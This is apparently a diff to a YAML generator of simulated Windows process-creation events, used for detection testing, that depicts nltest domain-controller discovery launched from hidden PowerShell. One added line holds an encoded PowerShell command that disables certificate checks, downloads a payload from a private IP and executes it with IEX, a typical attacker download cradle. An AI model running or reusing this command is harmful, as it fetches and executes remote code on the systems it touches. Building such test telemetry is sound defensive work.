@@ -35,11 +35,14 @@ state:
   image:               C:\Windows\System32\nltest.exe
   exec_path:           C:\Windows\system32\nltest.exe
   original_file_name:  nltestrk.exe
+  file_version:        10.0.14393.4283 (rs1_release.210303-1802)
+  integrity_level:     Medium
+  hashes:              "MD5=1171BC1F016201B83E30634121BA2A40,SHA256=8DB95007AC3DD96C487C0CC477BD89A6282D6F0949EBCECBBDA4F8D37C2A959C,IMPHASH=4C049D80BB0FE7E8B0688666FFF88442"
   nltest_switch:       "/dclist:"
   command_line:        '"${ref.exec_path}" ${ref.nltest_switch}'
   current_directory:   "C:\\Users\\${ref.username}\\"
   parent_image:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-  parent_command_line: "powershell  -exec bypass -Noninteractive -windowstyle hidden"
+  parent_command_line: "powershell  -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQAwAC4AMAAuADEALgAxADYALwBiAGgALwBzAHkAbgBjAC8AYQBvAGwALwBfAHIAcAAnACkAKQApADsASQBFAFgAIAAkAE0AUwA="
 
 steps:
   - emit:
@@ -79,7 +82,7 @@ steps:
             - "@Name": Image
               "#text": ref.image
             - "@Name": FileVersion
-              "#text": 10.0.14393.4283 (rs1_release.210303-1802)
+              "#text": ref.file_version
             - "@Name": Description
               "#text": "Microsoft® Logon Server Test Utility"
             - "@Name": Product
@@ -101,9 +104,9 @@ steps:
             - "@Name": TerminalSessionId
               "#text": 2
             - "@Name": IntegrityLevel
-              "#text": Medium
+              "#text": ref.integrity_level
             - "@Name": Hashes
-              "#text": "MD5=1171BC1F016201B83E30634121BA2A40,SHA256=8DB95007AC3DD96C487C0CC477BD89A6282D6F0949EBCECBBDA4F8D37C2A959C,IMPHASH=4C049D80BB0FE7E8B0688666FFF88442"
+              "#text": ref.hashes
             - "@Name": ParentProcessGuid
               "#text": ref.parent_process_guid
             - "@Name": ParentProcessId
